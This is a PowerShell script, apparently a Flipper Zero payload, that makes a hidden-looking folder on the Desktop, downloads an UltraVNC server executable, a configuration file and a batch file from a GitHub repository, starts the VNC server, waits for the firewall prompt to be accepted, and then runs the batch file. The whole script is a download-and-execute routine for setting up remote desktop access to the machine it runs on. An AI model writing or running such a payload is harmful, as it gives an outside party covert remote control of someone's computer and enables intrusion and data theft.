# Wait for 2 seconds
Start-Sleep -Seconds 2

# Get the Desktop path using environment variables
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop), 'inentor')

# Create the folder
New-Item -ItemType Directory -Path $desktopPath -Force
# Wait for 2 seconds
Start-Sleep -Seconds 2

# Define URLs for the files to download
$url1 = "https://github.com/TriPaGonski/VNCFLIPPERZERO/raw/main/winvnc.exe"
$url2 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/ultravnc.ini"
$url3 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/Main.bat"

# Define the local file paths
$filePath1 = "$desktopPath\winvnc.exe"
$filePath2 = "$desktopPath\ultravnc.ini"
$filePath3 = "$desktopPath\main.bat"

# Download the files
Invoke-WebRequest -Uri $url1 -OutFile $filePath1
# Wait for 2 seconds
Start-Sleep -Seconds 2
Invoke-WebRequest -Uri $url2 -OutFile $filePath2
# Wait for 2 seconds
Start-Sleep -Seconds 2
Invoke-WebRequest -Uri $url3 -OutFile $filePath3
# Wait for 2 seconds
Start-Sleep -Seconds 2

# List the directory contents to verify files are downloaded
Get-ChildItem -Path $desktopPath

# Start winvnc.exe to trigger firewall prompt
Start-Process -FilePath $filePath1 -ArgumentList "-run" -WorkingDirectory $desktopPath

# Wait for user to accept firewall prompt
Start-Sleep -Seconds 10

# Execute the main.bat file
Start-Process -FilePath $filePath3 -WorkingDirectory $desktopPath -NoNewWindow
